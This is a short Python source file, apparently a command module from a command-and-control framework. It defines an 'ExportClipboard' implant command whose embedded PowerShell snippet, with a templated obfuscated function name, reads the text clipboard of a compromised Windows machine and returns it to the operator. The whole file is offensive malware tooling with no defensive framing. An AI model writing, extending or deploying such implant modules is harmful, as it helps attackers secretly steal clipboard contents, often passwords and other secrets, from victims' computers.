class ExportClipboard:
    type = "EC"
    args = None
    input = "export_clipboard"

    def process_implant_response(self):
        print("We're processing clipboard data.")

    def implant_text(self):
        var ='''
function {{ ron.obf_get_clipboard }}() {
    $b = "Text"
    $a = Get-Clipboard -Format $b
    if ($a -ne $null ){$Script:tr = $a}
    else {$Script:tr = "No clipboard data."}
}
'''
        return var
